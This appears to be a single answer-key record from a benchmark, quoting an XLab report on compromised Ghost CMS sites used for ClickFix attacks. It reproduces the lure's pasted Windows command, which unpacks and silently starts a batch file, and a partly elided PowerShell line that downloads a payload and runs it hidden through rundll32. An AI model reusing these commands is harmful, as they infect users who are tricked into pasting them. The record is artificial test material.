    ground_truth: 'XLab: pasted command ''move %USERPROFILE%\Downloads\update.zip %TEMP%\u.zip && tar -xf %TEMP%\u.zip -C %TEMP% && start /min
      "" %TEMP%\update.bat''; update.bat ''powershell -W 1 -C ... iwr ... Start-Process rundll32 -ArgumentList $f,''Begin'' -Window Hidden''.'
    ground_truth_url: https://blog.xlab.qianxin.com/ghost-cms-mass-compromised-via-cve-2026-26980-now-fueling-clickfix-attacks/
